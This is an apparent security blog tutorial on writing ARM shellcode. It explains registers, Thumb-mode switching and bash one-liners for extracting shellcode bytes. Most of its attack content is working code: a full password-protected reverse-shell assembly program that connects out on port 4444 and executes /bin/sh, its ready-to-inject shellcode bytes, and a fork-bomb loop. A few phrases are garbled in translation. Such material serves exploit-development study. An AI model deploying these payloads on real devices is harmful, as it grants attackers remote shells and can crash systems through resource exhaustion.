---
title: Writing ARM Shellcodes
date: 2022-9-26
layout: single
classes: wide
tags:
  - Assembly
  - Pwn
  - Shellcode
--- 

This first post will teach you how to write shellcodes in ARM.

## Shellcode Writing Basics

**Registers:**
- `R0-R10` : General Purpose Register
- `R11`    : Frame Pointer (FP)
- `R12`    : Intra Procedural Call (IPC)
- `R13`    : Stack Pointer (SP)
- `R14`    : Link Register (LR)
- `R15`    : Program Counter/Instruction Pointer (PC)


ARM has 2 modes, the Thumb mode has instructions in 16 bits and the ARM mode has instructions in 32 bits.

to switch in Thumb mode here is what you have to do : 
```asm
 add r0, pc, #1
 bx  r0
// le code qui suivera sera en thumb mode
```
in a first time we add 1 to PC (Program Counter) then we put the result in r0. For the 2nd instruction we use BX (Branch & Exchange) in r0. If LSB=1 (low weight bit) then we are in thumb mode.

![](https://i.imgur.com/z7tNUe5.png)




several techniques exist to parse a shellcode:

1 - usage of awk
```bash
for i in $(objdump -d hello | grep "^ "|awk -F"[\t]" '{print $2}'); do echo -n ${i:6:2}${i:4:2}${i:2:2}${i:0:2};done| sed 's/.\{2\}/\\x&/g'
```
2 - usage of regex + **addition of double quotes**
```bash
objdump -d hello |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```
3 - usage of **hexdump** and **objcopy**
```bash
objcopy -O binary fichier.bin fichier.dump && hexdump -v -e '"\\""x" 1/1 "%02x" ""' fichier.dump
```

![](https://i.imgur.com/VUjjIrl.png)



### Reverse Shell in ARM

![](https://i.imgur.com/xbUxAgq.png)

here is how to make a structure in ARM : 

```asm
adr r1, _sockaddr @ sockaddr struct 
...

_sockaddr: 
 	.hword 2 @ sin_family 
 	.hword 0x5c11 // sin_port 4444
 	.word 0x100007f @ sin_addr 127.0.0.1
 	.byte 0,0,0,0,0,0,0,0 @ sin_zero 
```
then we use dup2() to redirect the standard outputs.

### Password-Protected Reverse Shell

```asm
.section .text
.global _start
_start:

.arm
    add   r3, pc, #1
    bx    r3

.thumb

    mov   r0, #2
    mov   r1, #1
    eor   r2, r2
    mov   r7, #200
    add   r7, #81
    svc   #1
mov   r10, r0 
    adr   r1, target
    strb  r2, [r1, #1]
    strb  r2, [r1, #5]
    strb  r2, [r1, #6] 
    mov   r2, #16
    add   r7, #2  
    svc   #1
    push  {r1}
    mov   r1, sp
    mov   r2, #4
    mov   r7, #3
    .read_pass:
        mov   r0, r10
        svc   #1
    .check_pass:
        ldr   r3, pass
        ldr   r4, [r1]
        eor   r3, r3, r4
    bne .read_pass
    mov   r1, #2 
    mov   r7, #63    
    .loop_stdio:
        mov   r0, r10
        svc   #1
        sub   r1,#1
    bpl .loop_stdio
    adr   r0, command
    eor   r2, r2
    eor   r1, r1
    strb  r2, [r0, #7]
    mov   r7, #11 
    svc   #1

target:
    .ascii "\x02\xff"  
    .ascii "\x11\x5c"
    
    .byte 127,255,255,1 
    
command: .ascii "/bin/sh?"
pass: .ascii "RistBS=aker"
```

if you didn't know, the registers from r0 to r10 are general purpose registers, the register r7 is used to identify the NR of the syscall.

This ascii character `x02\xff\x11\x5c` shows that we are using the TCP proto in IPv4 on port 4444.

**`.read_pass` & `.check_pass` Function:**

for the read function we will just use the C Function: `read(sourcefd, destbuffer, amount)`

- `eor r3, r3, r4` = *r3=r3^r4*
- `bne .read_pass` (Department if Not Equal) equivalent to JNE in x86. This instruction will jump to reading the mdp if it is not equal to the first args passed in r1. (address of r1 retrieved and stored in r4)


```bash
as ARM-reverse-shell.s -o ARM-reverse-shell.o && ld -N ARM-reverse-shell.o -o ARM-reverse-shell && objcopy -O binary ARM-reverse-shell ARM-reverse-shell.dump && hexdump -v -e '"\\""x" 1/1 "%02x" ""' ARM-reverse-shell.dump

\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\x20\x01\x21\x52\x40\xc8\x27\x51\x37\x01\xdf\x82\x46\x0e\xa1\x4a
\x70\x4a\x71\x8a\x71\x10\x22\x02\x37\x01\xdf\x02\xb4\x69\x46\x04\x22\x03\x27\x50\x46\x01\xdf\x0b\x4b\x0c\x68\x63\x40\xf9\xd1\x02\x21\x3f\x27\x50\x46\x01\xdf\x01\x39\xfb\xd5\x04\xa0\x52\x40\x49\x40\xc2
\x71\x0b\x27\x01\xdf\x02\xff\x11\x5c\x7f\xff\xff\x01\x2f\x62\x69\x6e\x2f\x73\x68\x3f\x53\x35\x39\x21
```

> Source : https://github.com/alanvivona/pwnshop/blob/master/src/0x15-ARM-shellcode/ARM-reverse-shell-with-auth.s


### Final test : ForkBomb


| NR | Syscall Name | %r7      |  arg0 (%r0)       |
| ---- |:----------------------- | --- | ----
| 2      | fork | 0x02 |    - |

```asm
.text
.global .start

.start:
	.code 32   
	add r3, pc, #1	
	bx r3

	.code 16
	.loop:
		eor r7, r7 
		add r7, #2
		svc #1
		mov r8, r8
		bl .loop
```

![](https://i.imgur.com/GcsZD2P.png)


### useful ressources : 
- https://www.youtube.com/watch?v=9tx293lbGuc
- https://www.youtube.com/watch?v=c_jUELOScLc

